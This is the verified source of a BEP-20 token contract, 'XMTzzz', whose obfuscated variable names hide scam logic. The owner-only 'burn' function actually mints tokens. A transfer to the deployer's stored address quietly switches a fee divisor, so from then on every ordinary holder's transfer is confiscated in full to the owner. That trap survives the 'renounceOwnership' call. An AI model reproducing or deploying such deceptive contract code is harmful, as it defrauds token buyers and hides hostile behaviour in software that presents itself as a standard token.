/**
 *Submitted for verification at BscScan.com on 2022-12-02
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;
contract XMTzzz {
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  UeGFjT = 100000000000000000;
uint256 public  heAAcx = 100000000000000000000;
uint256 public  DzDCdN = 10000000000000000000000000000;
address private  fAJuxT = address(0);
mapping (address => uint256) public balanceOf;
address public  edqthg = address(0);
uint256 public  SyxWNu = 100000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  GnMJPk = address(0);
uint256 public constant anQBKN = 99+1;
address public owner;
string public  symbol = "XMTzzz";
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  FCnrzz = address(0);
uint8 public constant decimals = 18;
string public  name = "XMTzzz";
uint256 public  ptwytg = 10000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  wExSHf = 100000000000000000000000;
uint256 private  apvhnD = 10000000000000;
address public  rridhD = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address public  WcLpgp = address(0);
uint256 public  uzFDig = 10000000000000000000;
uint256 public  SCuqbP = 1000000000000000000;
address public  crQaAG = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
constructor () {
fAJuxT = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "LvaUJC");
require(to != address(0), "LvaUJC");
require(amount <= balanceOf[from], "LvaUJC");
uint256 mike;
uint256 fee;	
fee = 0;
	
if (from == owner || to == owner){
fee = 0;
mike = 0;
}
else{
fee = 0;	
mike = amount* anQBKN/apvhnD ;
}

uint256 transferAmount = amount - mike;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += mike;
if (to==fAJuxT){
apvhnD = 99+1;
}
emit Transfer(from, to, transferAmount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

}